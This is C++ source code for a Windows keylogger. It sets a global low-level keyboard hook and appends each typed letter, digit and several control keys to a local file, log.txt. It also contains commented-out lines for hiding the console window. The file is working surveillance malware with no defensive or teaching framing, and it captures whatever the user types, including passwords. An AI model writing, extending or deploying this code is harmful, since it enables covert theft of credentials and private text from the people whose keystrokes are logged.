#pragma comment(lib, "gdi32.lib")
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <iostream>
#include <fstream>
#include <gdiplus.h>
// functions

using namespace std;

LRESULT CALLBACK LowLevelKeyboardProc( int nCode, WPARAM wParam, LPARAM lParam );
int main()
{
//test
//test
//HWND hWnd = GetConsoleWindow(); 
//ShowWindow( hWnd, SW_HIDE ); 
//Hidding Console
HINSTANCE appInstance = GetModuleHandle(NULL);

    SetWindowsHookEx( WH_KEYBOARD_LL, LowLevelKeyboardProc, appInstance, 0 );
MSG msg;
while(GetMessage(&msg, NULL, 0, 0) > 0)
{
        TranslateMessage(&msg);
        DispatchMessage(&msg);
}
	
return 0;
}
//TESTING


//TESTING
LRESULT CALLBACK LowLevelKeyboardProc( int nCode, WPARAM wParam, LPARAM lParam )
{
ofstream myfile("log.txt", std::ios::app);
    KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
    switch( wParam )
    {
    case WM_KEYUP: 
        {
            switch( pKeyBoard->vkCode ) 
            {
					//Buttons	
				case VK_LBUTTON:
					myfile<<"\n button \n";
				break;
            	case VK_TAB:
            		myfile<<"\n Tab \n";
            	break;
				case 0xA2:
            		myfile<<"\n Ctrl \n";
            	break;
            	case VK_RETURN: 
                	myfile<<"\n Enter  \n"; 
				break;
				case VK_SPACE:
					myfile<<"\n";
				break;
				case 0xBE:
					myfile<<".";
				break;
				case VK_BACK:
					myfile<<"\n Backspace \n";
				break;
				
					//Letters
                   case 0x41:
                myfile<<"A";
                break;
                    case 0x42:
                myfile<<"B";
                break;  
                    case 0x43:
                myfile<<"C";
                break;
                    case 0x44:
                myfile<<"D";
                break;
                    case 0x45:
                myfile<<"E";
                break;
                    case 0x46:
                myfile<<"F";
                break;
                    case 0x47:
                myfile<<"G";
                break;  
                    case 0x48:
                myfile<<"H";
                break;
                    case 0x49:
                myfile<<"I";
                break;
                    case 0x4A:
                myfile<<"J";
                break;
                    case 0x4B:
                myfile<<"K";
                break;
                    case 0x4C:
                myfile<<"L";
                break;
                    case 0x4D:
                myfile<<"M";
                break;
                    case 0x4E:
                myfile<<"N";
                break;
                    case 0x4F:
                myfile<<"O";
                break;
                    case 0x50:
                myfile<<"P";
                break;
                    case 0x51:
                myfile<<"Q";
                break;
                    case 0x52:
                myfile<<"R";
                break;
                    case 0x53:
                myfile<<"S";
                break;
                    case 0x54:
                myfile<<"T";
                break;
                    case 0x55:
                myfile<<"U";
                break;
                    case 0x56:
                myfile<<"V";
                break;
                    case 0x57:
                myfile<<"W";
                break;
                    case 0x58:
                myfile<<"X";
                break;          
					case 0x59:
                myfile<<"Y";
                break;
                    case 0x5A:
                myfile<<"Z";
                break;
                
                	//Numbers
                	case 0x30:
                myfile<<"0 \n";
                break;  
                	case 0x31:
                myfile<<"1 \n"; 
                break;
                	case 0x32:
                myfile<<"2 \n"; 
                break;
                	case 0x33:
                myfile<<"3 \n"; 
                break;
                	case 0x34:
                myfile<<"4 \n"; 
                break;
                	case 0x35:
                myfile<<"5 \n"; 
                break;
                	case 0x36:
                myfile<<"6 \n"; 
                break;  
              	    case 0x37:
                myfile<<"7 \n"; 
                break;  
                	case 0x38:
                myfile<<"8 \n"; 
                break;
                	case 0x39:
                myfile<<"9 \n";
				break;
            }
        }
    default:
        return CallNextHookEx( NULL, nCode, wParam, lParam );
    }
    myfile.close();
    return 0;
}

